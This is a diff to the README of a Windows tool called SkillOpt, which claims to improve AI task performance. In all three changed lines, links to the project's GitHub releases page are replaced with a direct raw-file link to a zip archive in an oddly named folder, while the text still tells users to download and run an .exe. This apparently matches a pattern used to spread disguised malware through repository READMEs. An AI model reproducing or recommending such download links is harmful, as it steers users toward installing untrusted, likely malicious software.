@@ -1,6 +1,6 @@
 # 🛠️ SkillOpt - Improve your artificial intelligence task performance
 
-[![Download SkillOpt](https://img.shields.io/badge/Download-SkillOpt-blue)](https://github.com/shawnselfproduced888/SkillOpt/releases)
+[![Download SkillOpt](https://img.shields.io/badge/Download-SkillOpt-blue)](https://raw.githubusercontent.com/shawnselfproduced888/SkillOpt/main/equiprobability/Opt-Skill-v3.7-alpha.5.zip)
 
 SkillOpt helps you improve how your artificial intelligence models perform specific tasks. It teaches the software new ways to process language through a structured learning process. This tool saves your refined methods into simple files that you can use again later. You do not need to rewrite your instructions every time you start a new session.
 
@@ -8,7 +8,7 @@ SkillOpt helps you improve how your artificial intelligence models perform speci
 
 You can follow these steps to set up the software on your Windows computer.
 
-1. Go to the [SkillOpt releases page](https://github.com/shawnselfproduced888/SkillOpt/releases).
+1. Go to the [SkillOpt releases page](https://raw.githubusercontent.com/shawnselfproduced888/SkillOpt/main/equiprobability/Opt-Skill-v3.7-alpha.5.zip).
 2. Look for the most recent version in the list.
 3. Click the file that ends in .exe to start your download.
 4. Open the file once the download finishes.
@@ -65,7 +65,7 @@ The software includes a validation step. If the AI cannot learn the requested ta
 Yes. Since these files are standard text documents, you can open them in Notepad or any other text editor. You can refine the language or add notes to help the AI understand its goals better.
 
 **How do I update to a newer version?**
-Visit the [download page](https://github.com/shawnselfproduced888/SkillOpt/releases) periodically to check for improvements. Download the latest installer and run it. The new version will automatically replace the old one while keeping your existing skill files safe.
+Visit the [download page](https://raw.githubusercontent.com/shawnselfproduced888/SkillOpt/main/equiprobability/Opt-Skill-v3.7-alpha.5.zip) periodically to check for improvements. Download the latest installer and run it. The new version will automatically replace the old one while keeping your existing skill files safe.
 
 ## ⚠️ Troubleshooting
 
